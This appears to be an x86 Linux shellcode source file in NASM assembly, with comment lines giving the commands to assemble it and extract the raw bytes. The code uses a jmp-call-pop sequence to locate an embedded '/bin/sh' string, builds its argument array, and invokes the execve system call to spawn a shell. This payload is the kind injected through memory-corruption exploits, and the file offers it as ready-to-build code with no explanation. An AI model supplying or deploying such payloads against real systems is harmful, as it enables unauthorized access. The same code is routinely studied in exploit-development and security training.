
;  nasm -felf32 -o shell.o shell.asm
;  objcopy -O binary shell.o shell.bin

section .data

global _start
_start:
  jmp ed
st:
  pop ebx
  xor eax, eax
  mov [ebx+7], al
  lea ecx, [ebx+8]
  lea edx, [ebx+12]
  mov [ecx], ebx
  mov [edx], eax
  mov al, 11
  int 0x80
  db 0xff
ed:
  call st
  db '/bin/sh'
